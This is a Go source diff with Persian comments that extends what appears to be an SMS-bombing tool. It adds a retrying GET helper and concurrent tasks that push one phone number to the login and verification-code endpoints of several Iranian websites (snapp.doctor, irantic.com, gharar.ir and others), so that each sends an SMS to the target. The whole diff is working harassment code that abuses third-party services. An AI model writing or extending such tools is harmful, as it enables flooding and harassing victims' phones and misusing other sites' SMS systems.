@@ -175,6 +175,59 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 		resp.Body.Close() 
 		return 
 	}
+}// تابع sendGETRequest jadid
+func sendGETRequest(ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
+	defer wg.Done()
+
+	const maxRetries = 3
+	const retryDelay = 2 * time.Second // کمی کمتر از POST برای GET
+
+	for retry := 0; retry < maxRetries; retry++ {
+		select {
+		case <-ctx.Done():
+			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+			ch <- 0
+			return
+		default:
+		}
+
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // متد GET و Body = nil
+		if err != nil {
+			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
+			if retry == maxRetries-1 {
+				ch <- http.StatusInternalServerError
+				return
+			}
+			time.Sleep(retryDelay)
+			continue
+		}
+
+		resp, err := http.DefaultClient.Do(req)
+		if err != nil {
+			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
+				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
+				if retry == maxRetries-1 {
+					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
+					ch <- http.StatusInternalServerError
+					return
+				}
+				time.Sleep(retryDelay)
+				continue
+			} else if ctx.Err() == context.Canceled {
+				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
+				ch <- 0
+				return
+			} else {
+				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
+				ch <- http.StatusInternalServerError
+				return
+			}
+		}
+
+		ch <- resp.StatusCode
+		resp.Body.Close()
+		return // موفقیت آمیز بود، از حلقه تلاش مجدد خارج می شویم
+	}
 }
 // توابع کمکی برای فرمت کردن شماره تلفن (برای استفاده داخلی در task ها)
 func getPhoneNumberNoZero(phone string) string {
@@ -302,9 +355,58 @@ func main() {
 
 
 
+		// https://poltalk.me/api/v1/auth/phone (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://poltalk.me/api/v1/auth/phone", map[string]interface{}{
+				"phone": phone, // نیاز به 0 اول دارد
+			}, &wg, ch)
+		}
+		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "refah_send_code") // مقادیر ثابت
+			formData.Set("mobile", phone) // نیاز به 0 اول دارد
+			formData.Set("security", "placeholder") // ممکن است نیاز به دینامیک باشد
 
-
-
+			sendFormRequest(ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+		// https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=09123456456 (GET)
+		wg.Add(1)
+		tasks <- func() {
+			// شماره تلفن در Query String قرار می‌گیرد
+			urlWithPhone := fmt.Sprintf("https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=%s", phone) // نیاز به 0 اول
+			sendGETRequest(ctx, urlWithPhone, &wg, ch)
+		}
+		// https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/09123456456/sms?cCode=%2B98 (GET)
+		wg.Add(1)
+		tasks <- func() {
+			// شماره تلفن مستقیم در URL قرار می‌گیرد
+			urlWithPhone := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=+98", phone) // نیاز به 0 اول و کد کشور در Query
+			sendGETRequest(ctx, urlWithPhone, &wg, ch)
+		}
+		// https://pirankalaco.ir/SendPhone.php (Form Data)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("phone", phone) // نیاز به 0 اول دارد
+			sendFormRequest(ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
+		}
+		// https://gharar.ir/users/phone_number/ (Form Data)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("phone", phone) // نیاز به 0 اول دارد
+			sendFormRequest(ctx, "https://gharar.ir/users/phone_number/", formData, &wg, ch)
+		}
+                // https://www.irantic.com/api/login/authenticate (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
+				"mobile": phone, // نیاز به 0 اول دارد
+			}, &wg, ch)
+		}
 			// gifkart.com (SMS - POST Form)
 			wg.Add(1)
 			tasks <- func() {
